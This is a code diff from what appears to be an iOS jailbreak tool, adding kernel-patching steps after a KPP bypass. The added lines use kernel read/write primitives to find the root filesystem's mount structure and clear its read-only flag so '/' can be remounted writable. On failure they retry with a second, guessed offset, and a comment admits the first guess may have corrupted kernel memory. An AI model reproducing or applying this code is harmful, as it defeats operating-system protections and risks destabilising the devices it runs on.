@@ -182,6 +182,7 @@ uint64_t physalloc(uint64_t size) {
 void kpp(uint64_t kernbase, uint64_t slide){
     postProgress(@"running KPP bypass");
     
+    init_kernel(kernbase, NULL);
     checkvad();
     
     uint64_t entryp;
@@ -634,6 +635,14 @@ remappage[remapcnt++] = (x & (~PMK));\
         sleep(1);
     }
     
+    vm_offset_t off = 0xd0;
+    
+    uint64_t _rootvnode = find_rootvnode();
+    uint64_t rootfs_vnode = kread_uint64(_rootvnode);
+    uint64_t v_mount = kread_uint64(rootfs_vnode + off);
+    uint32_t v_flag = kread_uint32(v_mount + 0x71);
+    
+    kwrite_uint32(v_mount + 0x71, v_flag & ~(1 << 6));
 
     char* nm = strdup("/dev/disk0s1s1");
     int mntr = mount("hfs", "/", 0x10000, &nm);
@@ -642,9 +651,22 @@ remappage[remapcnt++] = (x & (~PMK));\
     if (open("/v0rtex", O_CREAT | O_RDWR, 0644)>=0){
         printf("write test success!\n");
         remove("/v0rtex");
-    }else
-        printf("[!] write test failed!\n");
+    }else {
+        //try other offset, hopefully if the first was incorrect it didn't mess something in the kernel, will make my mind up once I get a tester
+        printf("[!] write test failed! trying again \n");
+        off = 0xd8;
 
+        v_mount = kread_uint64(rootfs_vnode + off);
+        v_flag = kread_uint32(v_mount + 0x71);
+        kwrite_uint32(v_mount + 0x71, v_flag & ~(1 << 6));
+        
+        if (open("/v0rtex", O_CREAT | O_RDWR, 0644)>=0){
+            printf("write test success!\n");
+            remove("/v0rtex");
+        }
+        else printf("[!] write test failed! trying again \n");
+
+    }
 
     NSLog(@"enabled patches");
 }
